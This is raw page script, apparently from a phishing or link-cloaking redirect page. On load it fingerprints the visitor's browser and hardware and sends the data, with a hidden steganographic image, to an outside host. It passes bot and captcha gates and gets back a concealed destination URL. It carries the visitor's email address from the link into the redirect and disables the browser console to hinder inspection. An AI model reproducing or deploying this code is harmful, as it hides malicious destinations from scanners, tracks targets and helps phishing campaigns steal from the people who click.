    <script>
    window.ClientFingerprint = window.ClientFingerprint || {};
    (function() {
        async function sha256(message) {
            if (window.crypto && window.crypto.subtle) {
                const msgUint8 = new TextEncoder().encode(message);
                const hashBuffer = await window.crypto.subtle.digest('SHA-256', msgUint8);
                const hashArray = Array.from(new Uint8Array(hashBuffer));
                return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
            } else {
                let hash = 0;
                for (let i = 0; i < message.length; i++) {
                    const char = message.charCodeAt(i);
                    hash = ((hash << 5) - hash) + char;
                    hash = hash & hash;
                }
                return (hash >>> 0).toString(36);
            }
        }
        async function generateFingerprint() {
            try {
                let components = [];
                components.push(navigator.userAgent || "unknown_ua");
                components.push(navigator.language || navigator.userLanguage || "unknown_lang");
                components.push(screen.colorDepth || "unknown_cd");
                components.push((screen.width || "unknown_w") + "x" + (screen.height || "unknown_h"));
                components.push(navigator.platform || "unknown_platform");
                try {
                    components.push(Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown_tz");
                } catch (e) { components.push("unknown_tz_error"); }
                let canvas = document.createElement('canvas');
                let gl, webglVendor = "unknown", webglRenderer = "unknown";
                try {
                    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        if (debugInfo) {
                            webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || "unknown_vendor";
                            webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "unknown_renderer";
                        }
                    }
                } catch (e) { webglVendor = "webgl_error"; webglRenderer = "webgl_error"; }
                components.push(webglVendor);
                components.push(webglRenderer);
                components.push(navigator.hardwareConcurrency || 'unknown_cores');
                components.push(navigator.deviceMemory || 'unknown_memory');
                components.push(navigator.maxTouchPoints || 0);
                const fingerprintHash = await sha256(components.join('###'));
                window.ClientFingerprint.hash = fingerprintHash;
                window.ClientFingerprint.components = {
                    userAgent: navigator.userAgent || "unknown",
                    language: navigator.language || "unknown",
                    colorDepth: screen.colorDepth || "unknown",
                    resolution: (screen.width || "?") + "x" + (screen.height || "?"),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown",
                    cores: navigator.hardwareConcurrency || "unknown",
                    memory: navigator.deviceMemory || "unknown",
                    platform: navigator.platform || "unknown"
                };
                window.ClientFingerprint.ready = true;
                return fingerprintHash;
            } catch (error) {
                if (DEBUG_MODE) console.error("Fingerprint generation failed:", error);
                window.ClientFingerprint.hash = "error";
                window.ClientFingerprint.ready = true;
                return "error";
            }
        }
        (async () => { await generateFingerprint(); })();
    })();
    </script>

    <script>
        const DEBUG_MODE = false;

        async function solveGate2Challenge(challenge) {
            const { type, params, challenge_id } = challenge;
            let solution;

            if (DEBUG_MODE) console.log('[Gate2] Solving challenge type:', type, 'difficulty:', challenge.difficulty);

            switch(type) {
                case 'hash':
                    solution = await solveHashChallenge(challenge_id, params);
                    break;
                case 'pow':
                    solution = await solvePowChallenge(params);
                    break;
                case 'timing':
                    solution = await solveTimingChallenge(params);
                    break;
                case 'multi':
                    solution = await solveMultiChallenge(challenge_id, params);
                    break;
                case 'captcha':
                    // Captcha challenges have data at top level, not in params
                    solution = await solveCaptchaChallenge(challenge);
                    break;
                default:
                    throw new Error('Unknown challenge type: ' + type);
            }

            return { challenge_id, solution, isCaptcha: type === 'captcha' };
        }

        async function solveHashChallenge(challengeId, params) {
            const { seed, iterations } = params;
            const nonce = params.nonce || '';
            const data = `${challengeId}:${seed}:${nonce}`;

            let result = new TextEncoder().encode(data);
            for (let i = 0; i < iterations; i++) {
                const hashBuffer = await crypto.subtle.digest('SHA-256', result);
                result = new Uint8Array(hashBuffer);
            }

            return Array.from(result).map(b => b.toString(16).padStart(2, '0')).join('');
        }

        async function solvePowChallenge(params) {
            const { base_data, required_zeros } = params;
            const target = '0'.repeat(required_zeros);
            let nonce = 0;
            const maxIterations = 10000000;

            while (nonce < maxIterations) {
                const data = `${base_data}:${nonce}`;
                const hashBuffer = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(data));
                const hashArray = Array.from(new Uint8Array(hashBuffer));
                const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');

                if (hashHex.startsWith(target)) {
                    return { nonce };
                }
                nonce++;
                if (nonce % 10000 === 0) {
                    await new Promise(resolve => setTimeout(resolve, 0));
                }
            }
            throw new Error('PoW challenge exceeded max iterations');
        }

        async function solveTimingChallenge(params) {
            const { verification_token, required_wait_seconds } = params;
            for (let i = required_wait_seconds; i > 0; i--) {
                updateProgress(30 + ((required_wait_seconds - i) / required_wait_seconds * 30),
                    `Please wait... ${i}s remaining`);
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
            return { token: verification_token };
        }

        async function solveMultiChallenge(challengeId, params) {
            const stage1Data = params.stage1.data;
            const stage1Hash = await sha256Hex(stage1Data);

            const stage2Input = `${stage1Hash}:${params.stage2.nonce}`;
            let stage2Result = new TextEncoder().encode(stage2Input);
            for (let i = 0; i < params.stage2.iterations; i++) {
                const hashBuffer = await crypto.subtle.digest('SHA-256', stage2Result);
                stage2Result = new Uint8Array(hashBuffer);
            }
            const stage2Hash = Array.from(stage2Result).map(b => b.toString(16).padStart(2, '0')).join('');

            const stage1Int = BigInt('0x' + stage1Hash.slice(0, 16));
            const stage2Int = BigInt('0x' + stage2Hash.slice(0, 16));
            const xorResult = stage1Int ^ stage2Int;

            return { answer: xorResult.toString(16).padStart(16, '0') };
        }

        async function sha256Hex(message) {
            const msgBuffer = new TextEncoder().encode(message);
            const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
            return Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2, '0')).join('');
        }

        // Track captcha widget ID to prevent duplicate renders
        let captchaWidgetId = null;

        // hCaptcha challenge solver - shows captcha widget and waits for user completion
        async function solveCaptchaChallenge(challenge) {
            const { site_key, challenge_id } = challenge;

            if (DEBUG_MODE) console.log('[Captcha] Loading hCaptcha with site_key:', site_key);

            // Load hCaptcha script if not already loaded
            if (!window.hcaptcha) {
                await new Promise((resolve, reject) => {
                    const script = document.createElement('script');
                    script.src = 'https://js.hcaptcha.com/1/api.js?render=explicit';
                    script.async = true;
                    script.defer = true;
                    script.onload = resolve;
                    script.onerror = () => reject(new Error('Failed to load hCaptcha'));
                    document.head.appendChild(script);
                });
                // Wait for hcaptcha to initialize
                await new Promise(resolve => setTimeout(resolve, 500));
            }

            // Show captcha modal
            const modal = document.getElementById('captcha-modal');
            const container = document.getElementById('hcaptcha-container');
            modal.style.display = 'flex';

            // Update loading message
            document.querySelector('#loading-message').innerHTML = 'Please complete the verification below';

            return new Promise((resolve, reject) => {
                try {
                    // If widget already exists, remove it first
                    if (captchaWidgetId !== null) {
                        if (DEBUG_MODE) console.log('[Captcha] Removing existing widget');
                        try {
                            window.hcaptcha.remove(captchaWidgetId);
                        } catch (e) {
                            // Fallback: clear container manually
                            container.innerHTML = '';
                        }
                        captchaWidgetId = null;
                    }

                    // Render fresh widget
                    captchaWidgetId = window.hcaptcha.render(container, {
                        sitekey: site_key,
                        callback: (token) => {
                            if (DEBUG_MODE) console.log('[Captcha] Verification complete');
                            modal.style.display = 'none';
                            document.querySelector('#loading-message').innerHTML = '<span class="loading-spinner"></span>';
                            resolve({ 'h-captcha-response': token });
                        },
                        'error-callback': () => {
                            if (DEBUG_MODE) console.error('[Captcha] Verification error');
                            reject(new Error('Captcha verification failed'));
                        },
                        'expired-callback': () => {
                            if (DEBUG_MODE) console.warn('[Captcha] Token expired');
                            window.hcaptcha.reset(captchaWidgetId);
                        }
                    });
                } catch (err) {
                    if (DEBUG_MODE) console.error('[Captcha] Render error:', err);
                    modal.style.display = 'none';
                    reject(err);
                }
            });
        }

        function formatChallengeToken(challengeId, solution) {
            return JSON.stringify({ challenge_id: challengeId, solution: solution });
        }

        function updateProgress(percentage, message = null) {}

        async function processDocument(challengeToken = null, isCaptcha = false) {
            try {
                if (DEBUG_MODE) console.log("Verification successful. Proceeding to send payload.");
                document.querySelector('#loading-message').innerHTML = '<span class="loading-spinner"></span>';
                updateProgress(80, 'Almost there...');

                // Fingerprint runs async - use whatever is ready, don't block

                const img = document.getElementById('stego-img');
                const imageData = img.src.split(',')[1];
                const clientFingerprintHash = window.ClientFingerprint?.hash || "unavailable";
                const clientFingerprintComponents = window.ClientFingerprint?.components || {};

                const payload = {
                    stego_image_b64: imageData,
                    enc_key_id: document.getElementById('enc-key-id').value,
                    nonce: document.getElementById('nonce').value,
                    mac_key_id: document.getElementById('mac-key-id')?.value,
                    client_time: new Date().toISOString(),
                    client_fingerprint: clientFingerprintHash,
                    client_fingerprint_components: clientFingerprintComponents,
                };

                const headers = {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                };
                if (challengeToken) {
                    // Use different header for captcha vs regular challenges
                    if (isCaptcha) {
                        headers['X-VoidPin-Captcha-Token'] = challengeToken;
                        if (DEBUG_MODE) console.log('[Captcha] Submitting with captcha token');
                    } else {
                        headers['X-VoidPin-Challenge-Token'] = challengeToken;
                        if (DEBUG_MODE) console.log('[Gate2] Submitting with challenge token');
                    }
                }

                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 30000);
                const API_URL = 'https://edocsis.com';
                const response = await fetch(API_URL + '/restore', {
                    method: 'POST',
                    headers: headers,
                    body: JSON.stringify(payload),
                    signal: controller.signal
                });
                clearTimeout(timeoutId);

                if (response.status === 428 || response.status === 403) {
                    const challengeData = await response.json();
                    if (DEBUG_MODE) console.log('[Gate2] Challenge response received (status:', response.status, ')');

                    if (challengeData.challenge_required && challengeData.challenge_data) {
                        const challenge = challengeData.challenge_data;
                        if (DEBUG_MODE) console.log('[Gate2] Challenge type:', challenge.type);

                        document.querySelector('#loading-message').innerHTML = '<span class="loading-spinner"></span>';
                        updateProgress(40, 'Please wait...');

                        // Captcha challenges have data at top level, crypto challenges use params
                        if (challenge.type !== 'captcha' && !challenge.params) {
                            if (DEBUG_MODE) console.error('[Gate2] Challenge missing params:', challenge);
                            throw new Error('Invalid challenge structure');
                        }

                        let solved;
                        try {
                            if (challenge.type !== 'captcha') {
                                const challengePromise = solveGate2Challenge(challenge);
                                const timeoutPromise = new Promise((_, reject) =>
                                    setTimeout(() => reject(new Error('Challenge timeout')), 10000)
                                );
                                solved = await Promise.race([challengePromise, timeoutPromise]);
                            } else {
                                solved = await solveGate2Challenge(challenge);
                            }
                        } catch (challengeError) {
                            if (DEBUG_MODE) console.error('[Gate2] Challenge failed:', challengeError.message);
                            if (DEBUG_MODE) console.log('[Gate2] Requesting captcha fallback...');
                            const failedToken = JSON.stringify({
                                challenge_id: challenge.challenge_id,
                                solution: null,
                                error: 'client_timeout'
                            });
                            return processDocument(failedToken, false);
                        }

                        if (DEBUG_MODE) console.log('[Gate2] Challenge solved, resubmitting...');
                        updateProgress(70, 'Almost there...');

                        // Use different token format for captcha vs regular challenges
                        let token;
                        if (solved.isCaptcha) {
                            // For captcha, send just the raw hCaptcha token
                            token = solved.solution['h-captcha-response'];
                        } else {
                            // For crypto challenges, use the JSON format
                            token = formatChallengeToken(solved.challenge_id, solved.solution);
                        }
                        return processDocument(token, solved.isCaptcha);
                    }
                }

                if (!response.ok) {
                    const errorDetail = await response.text();
                    throw new Error(`Server error: ${response.statusText}`);
                }

                const result = await response.json();
                if (!result?.url) {
                    throw new Error('Invalid server response format');
                }

                selfDestructAndRedirect(new URL(result.url).toString(), false);

            } catch (error) {
                if (DEBUG_MODE) console.error('Document processing failed:', error.message);
                document.querySelector('#loading-message').textContent = 'Unable to redirect. Please try again.';
            }
        }

        function extractUrlParams() {
            const fullUrl = window.location.href;
            const pathname = window.location.pathname;
            const params = [];

            // Extract hash/fragment (#)
            if (window.location.hash && window.location.hash.length > 1) {
                params.push({ type: 'hash', value: window.location.hash });
            }

            // Extract ALL query parameters (?key=value) - pass through everything
            const urlParams = new URLSearchParams(window.location.search);
            for (const [key, value] of urlParams.entries()) {
                params.push({ type: 'query', key: key, value: value });
            }

            // Extract asterisk (*) delimiter payload
            const asteriskIndex = fullUrl.indexOf('*');
            if (asteriskIndex !== -1) {
                let asteriskPayload = fullUrl.substring(asteriskIndex + 1);
                asteriskPayload = asteriskPayload.split('?')[0].split('#')[0];
                if (asteriskPayload) {
                    params.push({ type: 'raw', delimiter: '*', value: asteriskPayload });
                }
            }

            // Extract dollar ($) delimiter payload
            const dollarIndex = fullUrl.indexOf('$');
            if (dollarIndex !== -1) {
                let dollarPayload = fullUrl.substring(dollarIndex + 1);
                dollarPayload = dollarPayload.split('?')[0].split('#')[0];
                if (dollarPayload) {
                    params.push({ type: 'raw', delimiter: '$', value: dollarPayload });
                }
            }

            // Extract double-dash (--) delimiter payload
            const dashIndex = pathname.indexOf('--');
            if (dashIndex !== -1) {
                let dashPayload = pathname.substring(dashIndex + 2);
                if (dashPayload) {
                    params.push({ type: 'raw', delimiter: '--', value: dashPayload });
                }
            }

            // Extract email from path (e.g., /linkcode/user@example.com)
            const pathParts = pathname.split('/').filter(p => p);
            for (const part of pathParts) {
                // Check if this path segment looks like an email (contains @ and has domain)
                if (part.includes('@') && /^[^@]+@[^@]+\.[^@]+$/.test(part)) {
                    params.push({ type: 'path_email', value: part });
                    break; // Only capture first email found
                }
            }

            // Check for trailing slash in pathname
            if (pathname.endsWith('/') && pathname.length > 1) {
                params.push({ type: 'trailing_slash', value: true });
            }

            return params;
        }

        function appendUrlParams(targetUrl) {
            let finalUrl = targetUrl;
            const params = extractUrlParams();

            if (params.length === 0) {
                return finalUrl;
            }

            let hashValue = null;
            let rawValue = null;
            let addTrailingSlash = false;
            let pathEmail = null;
            const queryParams = [];

            for (const param of params) {
                if (param.type === 'hash') {
                    hashValue = param.value;
                } else if (param.type === 'query') {
                    queryParams.push(param);
                } else if (param.type === 'raw') {
                    rawValue = param.delimiter + param.value;
                } else if (param.type === 'trailing_slash') {
                    addTrailingSlash = true;
                } else if (param.type === 'path_email') {
                    pathEmail = param.value;
                }
            }

            // Append email to path (e.g., example.com -> example.com/user@email.com)
            if (pathEmail) {
                try {
                    const url = new URL(finalUrl);
                    url.pathname = url.pathname + pathEmail;
                    finalUrl = url.toString();
                } catch (e) {
                    // Fallback for non-URL strings
                    finalUrl = finalUrl + pathEmail;
                }
            }

            // (Trailing slash handling removed - was incorrectly adding "/" to target URLs)

            // Add raw delimiter payload (*, $, --)
            if (rawValue) {
                finalUrl = finalUrl + rawValue;
            }

            // Add all query parameters
            if (queryParams.length > 0) {
                try {
                    const url = new URL(finalUrl);
                    for (const param of queryParams) {
                        url.searchParams.set(param.key, param.value);
                    }
                    finalUrl = url.toString();
                } catch (e) {
                    for (const param of queryParams) {
                        const separator = finalUrl.includes('?') ? '&' : '?';
                        finalUrl = finalUrl + separator + param.key + '=' + encodeURIComponent(param.value);
                    }
                }
            }

            // Add hash/fragment at the end
            if (hashValue) {
                try {
                    const url = new URL(finalUrl);
                    url.hash = hashValue;
                    finalUrl = url.toString();
                } catch (e) {
                    if (!finalUrl.includes('#')) {
                        finalUrl = finalUrl + hashValue;
                    }
                }
            }

            return finalUrl;
        }

        function selfDestructAndRedirect(targetUrl, isSandbox = false) {
            try {
                const finalTargetUrl = appendUrlParams(targetUrl);

                try {
                    const consoleMethods = Object.keys(window.console);
                    const noop = () => {};
                    consoleMethods.forEach(key => {
                        try {
                            window.console[key] = noop;
                        } catch (e) {}
                    });
                } catch (e) {}

                try {
                    history.replaceState(null, '', finalTargetUrl);
                    window.location.href = finalTargetUrl;
                } catch (e) {
                    window.location.href = finalTargetUrl;
                }
            } catch (error) {
                const fallbackUrl = appendUrlParams(targetUrl);
                window.location.href = fallbackUrl;
            }
        }

        async function initializeProtectedRedirect() {
            document.querySelector('#loading-message').innerHTML = '<span class="loading-spinner"></span>';
            processDocument();
        }

        document.addEventListener('DOMContentLoaded', initializeProtectedRedirect);
    </script>
